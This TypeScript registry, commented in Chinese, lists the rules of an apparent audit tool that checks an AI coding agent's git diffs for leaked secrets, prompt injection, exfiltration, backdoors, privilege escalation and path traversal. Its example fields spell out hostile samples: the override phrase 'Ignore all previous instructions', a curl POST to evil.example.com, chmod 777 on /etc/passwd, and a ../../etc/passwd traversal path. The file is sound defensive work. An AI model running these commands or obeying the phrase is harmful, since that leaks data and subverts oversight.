// ============================================================
// index.ts · 规则注册表
// reporter 从此导入规则数组，循环调用——不再硬编码 import 每条规则
// v0.97：铁律与审计分离——defaultRules (A1-A11) + extendedRules (E1-E4)
// Last revised: v1.5.1（2026-08-21）——24 条注册：A1-A11 + A14-A23 + E1/E2/E4
// ============================================================

import type { Rule } from './types';
import { scanA1 } from './rule-a1-sensitive-files';
import { scanA2 } from './rule-a2-secret-leak';
import { scanA3 } from './rule-a3-careful-modify';
import { scanA4 } from './rule-a4-config-deleted';
import { scanA5 } from './rule-a5-honest-report';
import { scanA6 } from './rule-a6-build-broken';
import { scanA7 } from './rule-a7-read-before-write';
import { scanA8 } from './rule-a8-verify-before-continue';
import { scanA9 } from './rule-a9-no-injection';
import { scanA10 } from './rule-a10-no-poison';
import { scanA11 } from './rule-a11-no-abuse';
import { scanA14 } from './rule-a14-kb-cross-domain';
import { scanA15 } from './rule-a15-action-constraint';
import { scanA16 } from './rule-a16-unauthorized-change';
import { scanA17 } from './rule-a17-bulk-change';
import { scanA18 } from './rule-a18-junk-file';
import { scanA19 } from './rule-a19-commit-msg-quality';
import { scanA20 } from './rule-a20-network-exfiltration';
import { scanA21 } from './rule-a21-persistence';
import { scanA22 } from './rule-a22-privilege-escalation';
import { scanA23 } from './rule-a23-path-traversal';
import { scanE1 } from './rule-e1-no-test-files';
import { scanE2 } from './rule-e2-todo-undeclared';
// E3 已在 v1.2.5 并入 A11（行数维度），不再独立存在
import { scanE4 } from './rule-e4-low-comment-ratio';

/** 默认规则（A1-A11 + A18-A23 = 17 条）——始终生效（实测口径，与 HANDBOOK 对齐）
 * 归属说明：A14-A17 不在默认规则——A14 知识库越权 / A15 不盲动 / A16 非授权文件变更 /
 *      A17 异常批量变更按实注册归 extendedRules（扩展 7 条 = A14-A17 + E1/E2/E4，共 24 条）。
 *      A12（供应链安全）/ A13（文件权限）已永久跳号（并入 A11），编号不复用。
 * v1.1.5: A18 从 extendedRules 提升为 defaultRules
 *        评估：在 sofagent 自身仓库根目录跑 A18（排除 node_modules/.git/dist/.workbuddy/docs/archive）
 *        扫描 513 个文件 → 误报 0 个 < 阈值 3 → 提升为基线能力
 *
 * v1.3.3 #11: priority 字段单源化——runner.ts 从规则定义读优先级分组，
 *      不再维护独立 AUDIT_PRIORITY。新增规则只需在此填 priority。
 *      priority 取值：critical（安全红线 fast-fail）/ warning（业务底线）/ crutch（拐杖）/ extended（扩展） */
export const defaultRules: Rule[] = [
  { name: 'A1 不碰敏感', id: 'A1', number: 1, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA1, examples: { match: [".env","id_rsa.pem","credentials.json"], notMatch: ["src/utils/env.example.ts","config/env.template"] }, justification: '密钥/凭据/私钥文件不应提交到版本控制——提交即泄漏面' },
  { name: 'A2 不泄密钥', id: 'A2', number: 2, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA2, examples: { match: [['AK' + 'IA','IOSFODNN7EXAMPLE'].join(''),['sk' + '-','1234567890abcdef1234567890abcdef'].join('')], notMatch: ["示例 apiKey: REPLACE_ME 占位","config.example.json 模板"] }, justification: '密钥/令牌硬编码进代码或配置 = 直接泄漏面，必须走环境变量或密钥管理' },
  { name: 'A3 不改越界', id: 'A3', number: 3, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'warning', ruleType: 'diff', scan: scanA3, examples: { match: ["修改了 task 描述范围外的 src/secret/ 文件"], notMatch: ["修改文件在 task 描述范围内"] }, justification: '修改超出任务声明的文件范围——疑似越权编辑' }, // A3: 启发式检测误报率高，不适合硬拦截，归为「能力拐杖」
  { name: 'A4 不删配置', id: 'A4', number: 4, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA4, examples: { match: ["删除 .sofagent/config.yml"], notMatch: ["删除临时文件 tmp.txt"] }, justification: '配置文件被删除——审计规则/权限配置可能被绕过' },
  { name: 'A5 不瞒真相', id: 'A5', number: 5, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA5, examples: { match: ["commit message 为空"], notMatch: ["feat: 添加登录模块"] }, justification: 'commit message 为空或占位符——变更无说明，无法审计意图' },
  { name: 'A6 不坏构建', id: 'A6', number: 6, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA6, examples: { match: ["package.json 依赖版本被改但无测试记录"], notMatch: ["package.json 正常新增依赖并伴随测试记录"] }, justification: '构建配置异常改动且无验证记录——可能破坏构建' },
  { name: 'A7 不存盲改', id: 'A7', number: 7, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA7, examples: { match: ["修改了文件但无 Read 日志"], notMatch: ["修改前有 Read 记录"] }, justification: '被修改文件无读取记录——疑似盲改' },
  { name: 'A8 不逃验证', id: 'A8', number: 8, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA8, examples: { match: ["构建文件变更后无测试记录"], notMatch: ["构建变更伴随测试记录"] }, justification: '构建变更后无测试记录——可能逃过验证' },
  { name: 'A9 不纳注入', id: 'A9', number: 9, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA9, examples: { match: [['Ignore','all','previous','instr' + 'uctions'].join(' ')], notMatch: ["普通需求描述文本"] }, justification: 'commit message/内容含 prompt 注入模式——试图操纵下游读取者' },
  { name: 'A10 不引毒源', id: 'A10', number: 10, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA10, examples: { match: ["依赖黑名单包名","typosquatting 仿冒包"], notMatch: ["npm 官方常用依赖"] }, justification: '依赖变更引入风险包（黑名单/仿冒/恶意 postinstall）' },
  { name: 'A11 不滥资源', id: 'A11', number: 11, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA11, examples: { match: ["单次删除 5000 行"], notMatch: ["正常重构删除 50 行"] }, justification: '资源滥用（超大文件/大行数变更）——疑似异常操作' },
  // A12-A17 为预留/扩展编号：A12（供应链安全）和 A13（文件权限）已永久跳号——v0.99.4 合并入 A11（不滥资源），语义有重叠但不完全等价，A12/A13 独立规则留待未来版本恢复；A14-A17 见 extendedRules
  { name: 'A18 垃圾文件', id: 'A18', number: 18, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA18, examples: { match: ["a.txt","test123.tmp"], notMatch: ["src/index.ts"] }, justification: '临时/垃圾文件被提交——污染仓库' },
  // v1.2.5: A19 ruleClass 从 '业务底线' 改为 '工程规范'（msg 质量是工程规范，不是安全红线）
  { name: 'A19 msg 质量', id: 'A19', number: 19, evidenceMode: 'git-diff', ruleClass: '工程规范', priority: 'warning', ruleType: 'diff', scan: scanA19, examples: { match: ["commit message: update"], notMatch: ["fix: 修复登录页 500 错误"] }, justification: 'commit message 命中黑名单词或过短——无信息量' },
  // v1.2.5 新增：A20-A23 四条安全红线规则（必须在 defaultRules，不能放 extendedRules）
  { name: 'A20 不泄外联', id: 'A20', number: 20, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA20, examples: { match: [['cur' + 'l','-X','PO' + 'ST','https://' + 'evil.example.com'].join(' ')], notMatch: ['内网服务调用且任务相关'] }, justification: '数据外传（HTTP 直连/WebSocket/DNS 隧道）——疑似数据泄漏面' },
  { name: 'A21 不植后门', id: 'A21', number: 21, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA21, examples: { match: [('LaunchAgent ' + '自启配置'),('crontab 添加' + '自启')], notMatch: ['正常 cron 备份任务且任务相关'] }, justification: '持久化后门（自启/定时任务）——疑似植入后门' },
  { name: 'A22 不越权限', id: 'A22', number: 22, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA22, examples: { match: [['ch' + 'mod','77' + '7', '/' + 'etc/passwd'].join(' '), ('sudo' + 'ers') + ' 修改'], notMatch: ['正常脚本可执行位'] }, justification: '权限提升（全权限文件/提权配置/setuid）——疑似越权' },
  { name: 'A23 不逃路径', id: 'A23', number: 23, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA23, examples: { match: [['..', '..', 'etc', 'pass' + 'wd'].join('/')], notMatch: ['src/utils/path.ts 正常路径'] }, justification: '路径穿越/symlink 逃逸——越出工作区边界' },
];

/** 扩展规则（E1-E4 + A14-A17）——默认不生效，需 config.extendedRulesEnabled = true
 *
 * 编号规则：
 * - A14-A17：行为类扩展规则（沿用 A 系列编号，number = 规则号，与 defaultRules 同 namespace 但 A12-A13 已永久跳号，合并入 A11（语义部分重叠但不完全等价））
 * - E1-E4：引擎增强类扩展规则（E 系列，number = 200 + 序号，避免与 A 系列冲突）
 * v1.3.3 #11: priority 统一为 'extended'（扩展规则层） */
export const extendedRules: Rule[] = [
  { name: 'E1 不落测试', id: 'E1', number: 201, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'extended', ruleType: 'diff', scan: scanE1, examples: { match: ["src/production/some.test.ts"], notMatch: ["tests/some.test.ts"] }, justification: '测试文件被提交到生产目录' },
  { name: 'E2 TODO 未声明', id: 'E2', number: 202, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'extended', ruleType: 'diff', scan: scanE2, examples: { match: ["新增 TODO 未在任务中声明"], notMatch: ["TODO 已在任务中声明"] }, justification: '新增 TODO 未声明——遗留未完成项' },
  // E3 已在 v1.2.5 并入 A11（行数维度），编号跳号
  { name: 'E4 不低注释', id: 'E4', number: 204, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'extended', ruleType: 'diff', scan: scanE4, examples: { match: ["新增 300 行注释率 <5%"], notMatch: ["新增 100 行注释率正常"] }, justification: '新增大量代码注释率过低——维护性差' },
  { name: 'A14 知识库越权', id: 'A14', number: 14, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'extended', ruleType: 'diff', scan: scanA14, examples: { match: ["访问工作流声明范围外的知识页面"], notMatch: ["访问声明范围内的知识页面"] }, justification: '知识库访问超出工作流声明范围' },
  { name: 'A15 不盲动', id: 'A15', number: 15, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'extended', ruleType: 'diff', scan: scanA15, examples: { match: ["workflow 节点未声明 actions"], notMatch: ["workflow 节点声明了 actions"] }, justification: 'workflow 节点未声明可执行动作——无法审计' },
  { name: 'A16 非授权文件变更', id: 'A16', number: 16, evidenceMode: 'git-diff', ruleClass: '工程规范', priority: 'extended', ruleType: 'diff', scan: scanA16, description: '检测敏感目录/文件类型的非授权变更', examples: { match: ['修改非声明范围文件'], notMatch: ['修改声明范围内的文件'] }, justification: '非授权文件被修改（行为级）' },
  { name: 'A17 异常批量变更', id: 'A17', number: 17, evidenceMode: 'filesystem', ruleClass: '工程规范', priority: 'extended', ruleType: 'diff', scan: scanA17, description: '检测短时间内大量文件变更', examples: { match: ['单次提交 50 个文件'], notMatch: ['单次提交 5 个文件'] }, justification: '单次提交变更文件数超阈值——疑似批量异常操作' },
];

/** 全部规则——reporter 默认使用此数组（含 default + extended） */
export const rules: Rule[] = [...defaultRules, ...extendedRules];
